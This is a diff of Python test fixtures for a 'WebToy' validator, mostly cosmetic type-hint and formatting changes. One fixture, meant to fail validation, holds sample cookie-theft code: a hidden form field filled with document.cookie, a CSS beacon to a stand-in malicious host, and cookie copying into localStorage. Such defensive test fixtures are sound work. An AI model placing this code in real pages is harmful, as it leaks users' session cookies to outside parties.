@@ -2,10 +2,10 @@
 Sample WebToy fixtures for testing
 """
 
-from typing import Dict, Any
+from typing import Dict
 
 
-def bouncing_ball_webtoy() -> Dict[str, str]:
+def bouncing_ball_webtoy() -> dict[str, str]:
     """
     A simple bouncing ball animation WebToy
     """
@@ -13,7 +13,6 @@ def bouncing_ball_webtoy() -> Dict[str, str]:
         "html": """
         <canvas id="canvas" width="500" height="500"></canvas>
         """,
-        
         "css": """
         body {
             margin: 0;
@@ -28,7 +27,6 @@ def bouncing_ball_webtoy() -> Dict[str, str]:
             background: #000;
         }
         """,
-        
         "js": """
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
@@ -78,11 +76,11 @@ def bouncing_ball_webtoy() -> Dict[str, str]:
         
         // Start animation
         draw();
-        """
+        """,
     }
 
 
-def particle_system_webtoy() -> Dict[str, str]:
+def particle_system_webtoy() -> dict[str, str]:
     """
     A more complex particle system WebToy
     """
@@ -94,7 +92,6 @@ def particle_system_webtoy() -> Dict[str, str]:
             <input type="range" id="particleSlider" min="10" max="500" value="100">
         </div>
         """,
-        
         "css": """
         body {
             margin: 0;
@@ -125,7 +122,6 @@ def particle_system_webtoy() -> Dict[str, str]:
             margin-left: 10px;
         }
         """,
-        
         "js": """
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
@@ -205,11 +201,11 @@ def particle_system_webtoy() -> Dict[str, str]:
         // Initialize and start animation
         initParticles();
         animate();
-        """
+        """,
     }
 
 
-def invalid_webtoy_external_resources() -> Dict[str, str]:
+def invalid_webtoy_external_resources() -> dict[str, str]:
     """
     A WebToy that attempts to use external resources (should fail validation)
     """
@@ -218,7 +214,6 @@ def invalid_webtoy_external_resources() -> Dict[str, str]:
         <canvas id="canvas"></canvas>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
         """,
-        
         "css": """
         @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
         
@@ -227,7 +222,6 @@ def invalid_webtoy_external_resources() -> Dict[str, str]:
             background: url('https://example.com/bg.jpg');
         }
         """,
-        
         "js": """
         // Attempt to load external data
         fetch('https://api.example.com/data')
@@ -236,11 +230,11 @@ def invalid_webtoy_external_resources() -> Dict[str, str]:
             
         // Try to use window object
         window.alert('Hello');
-        """
+        """,
     }
 
 
-def malicious_webtoy_attempt() -> Dict[str, str]:
+def malicious_webtoy_attempt() -> dict[str, str]:
     """
     A WebToy that attempts malicious actions (should fail validation)
     """
@@ -252,13 +246,11 @@ def malicious_webtoy_attempt() -> Dict[str, str]:
             <input type="hidden" name="data" id="stolen">
         </form>
         """,
-        
         "css": """
         body::after {
             content: url('https://malicious-site.example.com/beacon');
         }
         """,
-        
         "js": """
         // Try to steal cookies
         document.getElementById('stolen').value = document.cookie;
@@ -271,5 +263,5 @@ def malicious_webtoy_attempt() -> Dict[str, str]:
         
         // Attempt to use localStorage
         localStorage.setItem('userData', document.cookie);
-        """
+        """,
     }
